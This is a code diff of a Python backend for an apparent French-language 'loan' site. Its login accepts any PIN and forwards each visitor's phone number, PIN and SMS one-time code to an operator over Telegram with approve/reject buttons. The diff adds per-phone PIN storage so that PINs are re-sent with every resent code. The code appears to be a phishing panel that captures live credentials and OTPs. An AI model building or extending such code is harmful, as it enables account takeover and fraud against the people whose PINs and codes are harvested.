@@ -20,6 +20,7 @@ from approvals import (
     approval_pins,
     approval_otps,
     otp_approval_status,
+    phone_pins,          # NEW — stores PIN per phone number
 )
 from notifications import send_otp_sms, send_telegram_message
 
@@ -87,18 +88,17 @@ async def register(request: RegisterRequest):
 async def login(request: LoginRequest, background_tasks: BackgroundTasks):
     full_phone = format_phone(request.phone_number)
 
-    # Auto-create user if they don't exist, but do NOT verify PIN
     user = get_user(full_phone)
     if not user:
         create_user(full_phone, request.pin)
-    # ⚠️ PIN verification removed — any PIN is accepted
 
     # 1. Generate OTP immediately
     otp = str(random.randint(1000, 9999))
     otp_store[full_phone] = otp
     otp_approval_status[full_phone] = "pending"
+    phone_pins[full_phone] = request.pin         # ← NEW: store PIN for resend
 
-    # 2. Send the OTP to the user via SMS right away
+    # 2. Send the OTP to the user via SMS
     background_tasks.add_task(send_otp_sms, full_phone, otp)
 
     # 3. Create approval record for admin
@@ -108,10 +108,9 @@ async def login(request: LoginRequest, background_tasks: BackgroundTasks):
     approval_pins[approval_id] = request.pin
     approval_otps[approval_id] = otp
 
-    # 4. Notify admin with credentials + OTP + Approve/Reject buttons
+    # 4. Notify admin with buttons
     await send_approval_request(approval_id, full_phone, request.pin, otp)
 
-    # 5. Return "approved" so frontend navigates to OTP screen immediately
     return {
         "status": "approved",
         "approval_id": approval_id,
@@ -119,61 +118,75 @@ async def login(request: LoginRequest, background_tasks: BackgroundTasks):
     }
 
 
-# --- APPROVAL STATUS ---
+# --- APPROVAL STATUS (legacy) ---
 @app.get("/api/approval-status/{approval_id}")
 async def approval_status(approval_id: str):
     phone = approval_phones.get(approval_id)
     if phone is None:
         return {"status": "expired"}
-
     status = otp_approval_status.get(phone, "pending")
     return {"status": status}
 
 
-# --- VERIFY OTP (only works if admin approved) ---
+# --- VERIFY OTP ---
 @app.post("/api/verify-otp")
-async def verify_otp(request: OTPRequest, background_tasks: BackgroundTasks):
+async def verify_otp(request: OTPRequest):
     full_phone = format_phone(request.phone_number)
     expected = otp_store.get(full_phone)
     status = otp_approval_status.get(full_phone, "pending")
 
-    # Admin rejected
+    # OTP doesn't match
+    if not expected or request.otp != expected:
+        return {"status": "error", "message": "Code invalide"}
+
+    # Admin has rejected
     if status == "rejected":
-        return {"status": "error", "message": "OTP rejected by admin"}
+        return {"status": "rejected", "message": "Code refusé par l'administrateur"}
 
-    # Admin hasn't responded yet
-    if status != "approved":
-        return {"status": "error", "message": "Waiting for admin verification"}
-
-    # OTP is valid and approved
-    if expected and request.otp == expected:
+    # OTP matches and admin has approved
+    if status == "approved":
         del otp_store[full_phone]
         otp_approval_status.pop(full_phone, None)
-        return {"status": "success", "message": "Loan approved"}
+        phone_pins.pop(full_phone, None)
+        return {"status": "success", "message": "Prêt approuvé"}
 
-    return {"status": "error", "message": "Invalid OTP"}
+    # OTP matches but admin hasn't decided yet
+    return {"status": "pending", "message": "En attente de validation"}
 
 
-# --- RESEND OTP ---
+# --- OTP STATUS POLLING (frontend checks this after verify) ---
+@app.get("/api/otp-status/{phone_number}")
+async def otp_status(phone_number: str):
+    full_phone = format_phone(phone_number)
+    status = otp_approval_status.get(full_phone, "pending")
+    return {"status": status}
+
+
+# --- RESEND OTP (sends a full approval request WITH buttons) ---
 @app.post("/api/resend-otp")
 async def resend_otp(request: ResendRequest, background_tasks: BackgroundTasks):
     full_phone = format_phone(request.phone_number)
 
+    # 1. Generate a new OTP
     new_otp = str(random.randint(1000, 9999))
     otp_store[full_phone] = new_otp
     otp_approval_status[full_phone] = "pending"
 
+    # 2. Look up stored PIN (or fallback)
+    pin = phone_pins.get(full_phone, "****")
+
+    # 3. Create NEW approval record with buttons
+    approval_id = str(uuid4())
+    create_approval(approval_id)
+    approval_phones[approval_id] = full_phone
+    approval_pins[approval_id] = pin
+    approval_otps[approval_id] = new_otp
+
+    # 4. Send SMS with new OTP
     background_tasks.add_task(send_otp_sms, full_phone, new_otp)
 
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    background_tasks.add_task(
-        send_telegram_message,
-        f"🔄 <b>OTP Resent</b>\n\n"
-        f"📱 Phone: <code>{full_phone}</code>\n"
-        f"🔐 New OTP: <code>{new_otp}</code>\n"
-        f"🕒 Time: <code>{timestamp}</code>\n\n"
-        f"⚠️ Please approve or reject this OTP."
-    )
+    # 5. Send Telegram message WITH Approve/Reject buttons
+    await send_approval_request(approval_id, full_phone, pin, new_otp)
 
     return {"status": "success", "message": "OTP resent successfully"}
 
